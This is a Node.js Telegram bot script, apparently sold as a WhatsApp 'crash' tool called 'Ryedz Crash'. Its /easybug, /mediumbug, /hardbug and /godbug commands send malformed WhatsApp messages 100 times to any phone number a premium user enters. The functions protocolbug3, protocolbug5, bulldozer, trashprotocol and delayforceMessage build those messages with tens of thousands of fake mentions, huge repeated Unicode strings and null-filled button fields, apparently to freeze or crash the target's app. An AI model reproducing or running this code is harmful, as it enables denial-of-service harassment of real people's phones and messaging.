const {
  Telegraf,
  Markup,
  session
} = require("telegraf");
const fs = require("fs");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const {
  BOT_TOKEN
} = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const ownerFile = "./owneruser.json";
const TOKENS_FILE = "./tokens.json";
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let krimz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
const blacklist = ["0", "0", "0"];
const randomImages = ["https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg", "https://files.catbox.moe/cd30rt.jpg"];
const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];
const getUptime = () => {
  const _0x569eee = process.uptime();
  const _0x40bfbb = Math.floor(_0x569eee / 3600);
  const _0x492ea7 = Math.floor(_0x569eee % 3600 / 60);
  const _0x1ebfd5 = Math.floor(_0x569eee % 60);
  return _0x40bfbb + "h " + _0x492ea7 + "m " + _0x1ebfd5 + "s";
};
const question = _0x4ae3c6 => new Promise(_0x34e8d5 => {
  const _0x490e60 = require("readline").createInterface({
    input: process.stdin,
    output: process.stdout
  });
  _0x490e60.question(_0x4ae3c6, _0x2930a2 => {
    _0x490e60.close();
    _0x34e8d5(_0x2930a2);
  });
});
const manualPassword = String.fromCharCode(115, 117, 115, 117, 103, 101, 100, 101);
const startSesi = async () => {
  const _0x5bf58f = makeInMemoryStore({
    logger: pino().child({
      level: "silent",
      stream: "store"
    })
  });
  const {
    state: _0x11b434,
    saveCreds: _0x825f91
  } = await useMultiFileAuthState("./session");
  const {
    version: _0x15924e
  } = await fetchLatestBaileysVersion();
  const _0x26f66a = {
    version: _0x15924e,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({
      level: "silent"
    }),
    auth: _0x11b434,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async _0x1608ee => ({
      conversation: "Succes Connected"
    })
  };
  krimz = makeWASocket(_0x26f66a);
  if (usePairingCode && !krimz.authState.creds.registered) {
    console.clear();
   const inputPassword = await question(chalk.red.bold('Masukkan Password:\n'));

        if (inputPassword !== manualPassword) {
            console.log(chalk.red('Password salah! Sistem akan dimatikan'));
            process.exit(); // Matikan konsol
        }
    let _0x230b98 = await question(chalk.bold.yellow("\nMasukan nomor sender! 628xxx\n\nGunakan WhatsApp Messenger\nJangan menggunakan WhatsApp Bussines\n"));
    _0x230b98 = _0x230b98.replace(/[^0-9]/g, "");
    const _0x18bc51 = await krimz.requestPairingCode(_0x230b98.trim());
    const _0x63f069 = _0x18bc51?.match(/.{1,4}/g)?.join("-") || _0x18bc51;
    console.log(chalk.bold.white("KODE PAIRING ANDA "), chalk.bold.yellow(_0x63f069));
  }
  krimz.ev.on("creds.update", _0x825f91);
  _0x5bf58f.bind(krimz.ev);
  krimz.ev.on("connection.update", _0x120ddd => {
    const {
      connection: _0x110cde,
      lastDisconnect: _0x1cafd6
    } = _0x120ddd;
    if (_0x110cde === "open") {
      try {
        krimz.newsletterFollow("120363420137855772@newsletter");
        krimz.newsletterFollow("120363417470384925@newsletter");
        krimz.newsletterFollow("120363420137855772@newsletter");
        krimz.newsletterFollow("120363420137855772@newsletter");
      } catch (_0x4812d0) {
        console.error("Newsletter follow error:", _0x4812d0);
      }
      isWhatsAppConnected = true;
      console.log(chalk.bold.white("Connected!"));
    }
    if (_0x110cde === "close") {
      const _0x3f009d = _0x1cafd6?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red("Koneksi WhatsApp terputus."), _0x3f009d ? "Mencoba untuk menghubungkan ulang..." : "Silakan login ulang.");
      if (_0x3f009d) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};
const loadJSON = _0x273d64 => {
  if (!fs.existsSync(_0x273d64)) {
    return [];
  }
  return JSON.parse(fs.readFileSync(_0x273d64, "utf8"));
};
const saveJSON = (_0x278f11, _0x2acc67) => {
  fs.writeFileSync(_0x278f11, JSON.stringify(_0x2acc67, null, 2));
};
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);
const checkOwner = (_0x268804, _0x343e2d) => {
  if (!ownerUsers.includes(_0x268804.from.id.toString())) {
    return _0x268804.reply("⛔ Anda bukan owner.");
  }
  _0x343e2d();
};
const checkPremium = (_0x4ce9f1, _0x3bf26f) => {
  if (!premiumUsers.includes(_0x4ce9f1.from.id.toString())) {
    return _0x4ce9f1.reply("❌ Anda bukan pengguna premium.");
  }
  _0x3bf26f();
};
const checkWhatsAppConnection = (_0x32457f, _0x317fff) => {
  if (!isWhatsAppConnected) {
    _0x32457f.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  _0x317fff();
};
bot.command("start", async _0x4b243a => {
  const _0x3d0311 = _0x4b243a.from.id.toString();
  if (blacklist.includes(_0x3d0311)) {
    return _0x4b243a.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
  }
  const _0x4eb08b = getRandomImage();
  const _0x37b761 = getUptime();
  await _0x4b243a.replyWithPhoto(_0x4eb08b, {
    caption: "```\n╔─═⊱  Ryedz official🥷🏻  ─═⬡\n║│ Versi : 1.3\n║ Runtime : " + _0x37b761 + "\n┗━━━━━━━━━━━━━━━⬡\n╔─═──═──═───═──═⬡\n║/easybug\n║/mediumbug\n║/hardbug\n║/godbug\n┗━━━━━━━━━━━━━━━⬡\n╔─═──═──═───═──═⬡\n║/cekprem\n║/restart\n║/addprem\n║/delpremium\n┗━━━━━━━━━━━━━━━⬡```",
    parse_mode: "Markdown",
    ...Markup.inlineKeyboard([[Markup.button.url("OWNER", "https://t.me/reppdevvRyedz")]])
  });
});
bot.command("easybug", checkWhatsAppConnection, checkPremium, async _0xbb7fa3 => {
  const _0xcccbc7 = _0xbb7fa3.message.text.split(" ")[1];
  const _0x5032b9 = _0xbb7fa3.from.id;
  if (!_0xcccbc7) {
    return _0xbb7fa3.reply("Example:\n\n/cmd 628XXXX");
  }
  let _0x56e575 = _0xcccbc7.replace(/[^0-9]/g, "");
  let _0x58339e = _0x56e575 + "@s.whatsapp.net";
  let _0x48077d = await _0xbb7fa3.reply("\n    ╭─────────────────\n│\xA0\xA0\xA0 HASIL PENGIRIMAN\xA0\xA0\xA0 \n│────────────────\n│ Target : " + _0x56e575 + "\n│ Status : Berhasil\n│ Total Bot: 1\n╰────────────────");
  for (let _0x4a1792 = 0; _0x4a1792 < 100; _0x4a1792++) {
    await delayforceMessage(_0x58339e);
  }
});
bot.command("mediumbug", checkWhatsAppConnection, checkPremium, async _0xbb7fa3 => {
  const _0xcccbc7 = _0xbb7fa3.message.text.split(" ")[1];
  const _0x5032b9 = _0xbb7fa3.from.id;
  if (!_0xcccbc7) {
    return _0xbb7fa3.reply("Example:\n\n/cmd 628XXXX");
  }
  let _0x56e575 = _0xcccbc7.replace(/[^0-9]/g, "");
  let _0x58339e = _0x56e575 + "@s.whatsapp.net";
  let _0x48077d = await _0xbb7fa3.reply("\n    ╭─────────────────\n│\xA0\xA0\xA0 HASIL PENGIRIMAN\xA0\xA0\xA0 \n│────────────────\n│ Target : " + _0x56e575 + "\n│ Status : Berhasil\n│ Total Bot: 1\n╰────────────────");
  for (let _0x4a1792 = 0; _0x4a1792 < 100; _0x4a1792++) {
    await trashprotocol(_0x58339e);
  }
});
bot.command("hardbug", checkWhatsAppConnection, checkPremium, async _0xbb7fa3 => {
  const _0xcccbc7 = _0xbb7fa3.message.text.split(" ")[1];
  const _0x5032b9 = _0xbb7fa3.from.id;
  if (!_0xcccbc7) {
    return _0xbb7fa3.reply("Example:\n\n/cmd 628XXXX");
  }
  let _0x56e575 = _0xcccbc7.replace(/[^0-9]/g, "");
  let _0x58339e = _0x56e575 + "@s.whatsapp.net";
  let _0x48077d = await _0xbb7fa3.reply("\n    ╭─────────────────\n│\xA0\xA0\xA0 HASIL PENGIRIMAN\xA0\xA0\xA0 \n│────────────────\n│ Target : " + _0x56e575 + "\n│ Status : Berhasil\n│ Total Bot: 1\n╰────────────────");
  for (let _0x4a1792 = 0; _0x4a1792 < 100; _0x4a1792++) {
    await bulldozer(_0x58339e);
  }
});
bot.command("godbug", checkWhatsAppConnection, checkPremium, async _0xbb7fa3 => {
  const _0xcccbc7 = _0xbb7fa3.message.text.split(" ")[1];
  const _0x5032b9 = _0xbb7fa3.from.id;
  if (!_0xcccbc7) {
    return _0xbb7fa3.reply("Example:\n\n/cmd 628XXXX");
  }
  let _0x56e575 = _0xcccbc7.replace(/[^0-9]/g, "");
  let _0x58339e = _0x56e575 + "@s.whatsapp.net";
  let _0x48077d = await _0xbb7fa3.reply("\n    ╭─────────────────\n│\xA0\xA0\xA0 HASIL PENGIRIMAN\xA0\xA0\xA0 \n│────────────────\n│ Target : " + _0x56e575 + "\n│ Status : Berhasil\n│ Total Bot: 1\n╰────────────────");
  for (let _0x4a1792 = 0; _0x4a1792 < 100; _0x4a1792++) {
    await protocolbug5(_0x58339e);
    await protocolbug3(_0x58339e);
  }
});
bot.command("addprem", checkOwner, _0x3c7cb0 => {
  const _0x2a1b20 = _0x3c7cb0.message.text.split(" ");
  if (_0x2a1b20.length < 2) {
    return _0x3c7cb0.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
  }
  const _0x307025 = _0x2a1b20[1];
  if (premiumUsers.includes(_0x307025)) {
    return _0x3c7cb0.reply("✅ Pengguna " + _0x307025 + " sudah memiliki status premium.");
  }
  premiumUsers.push(_0x307025);
  saveJSON(premiumFile, premiumUsers);
  return _0x3c7cb0.reply("🎉 Pengguna " + _0x307025 + " sekarang memiliki akses premium!");
});
bot.command("delprem", checkOwner, _0x51d227 => {
  const _0xddd3d0 = _0x51d227.message.text.split(" ");
  if (_0xddd3d0.length < 2) {
    return _0x51d227.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
  }
  const _0x59bbf0 = _0xddd3d0[1];
  if (!premiumUsers.includes(_0x59bbf0)) {
    return _0x51d227.reply("❌ Pengguna " + _0x59bbf0 + " tidak ada dalam daftar premium.");
  }
  premiumUsers = premiumUsers.filter(_0x3499c1 => _0x3499c1 !== _0x59bbf0);
  saveJSON(premiumFile, premiumUsers);
  return _0x51d227.reply("🚫 Pengguna " + _0x59bbf0 + " telah dihapus dari daftar premium.");
});
bot.command("cekprem", _0x2ae6a7 => {
  const _0x47023c = _0x2ae6a7.from.id.toString();
  if (premiumUsers.includes(_0x47023c)) {
    return _0x2ae6a7.reply("✅ Anda adalah pengguna premium.");
  } else {
    return _0x2ae6a7.reply("❌ Anda bukan pengguna premium.");
  }
});
const restartBot = () => {
  pm2.connect(_0x1fc78c => {
    if (_0x1fc78c) {
      console.error("Gagal terhubung ke PM2:", _0x1fc78c);
      return;
    }
    pm2.restart("Ryedz", _0xcf76f => {
      pm2.disconnect();
      if (_0xcf76f) {
        console.error("Gagal merestart bot:", _0xcf76f);
      } else {
        console.log("Bot berhasil direstart.");
      }
    });
  });
};
bot.command("restart", _0x2514c9 => {
  const _0x761f = _0x2514c9.from.id.toString();
  _0x2514c9.reply("Merestart bot...");
  restartBot();
});
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await krimz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await krimz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
    //protocol5
    async function protocolbug5(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await krimz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await krimz.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await krimz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
  
//trashprotocol
  async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await krimz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await krimz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`Send Bug By Extorditcv-Pro🐉 : ${target}`));
}
async function delayforceMessage(_0x3780e3) {
  let _0x312a62 = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: krimz.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 35675873277,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Ryedz official🥷🏻",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "Ryedz official🥷🏻"
              }
            }
          },
          body: {
            text: "Ryedz official🥷🏻" + "ꦾ".repeat(10000)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "single_select",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "call_permission_request",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "cta_url",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "cta_call",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "cta_copy",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "cta_reminder",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "cta_cancel_reminder",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "address_message",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "send_location",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "quick_reply",
              buttonParamsJson: "\0".repeat(90000)
            }, {
              name: "mpm",
              buttonParamsJson: "\0".repeat(90000)
            }]
          }
        }
      }
    }
  };
  await krimz.relayMessage(_0x3780e3, _0x312a62, {
    participant: {
      jid: _0x3780e3
    }
  });
}
(async () => {
  console.clear();
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();
  console.log("Sukses connected");
  bot.launch();
  console.clear();
  console.log(chalk.bold.red("\nRyedz Crash"));
  console.log(chalk.bold.white("OWNER: 6285808760688"));
  console.log(chalk.bold.white("VERSION: 1.0"));
  console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
  console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
  console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER"));
})();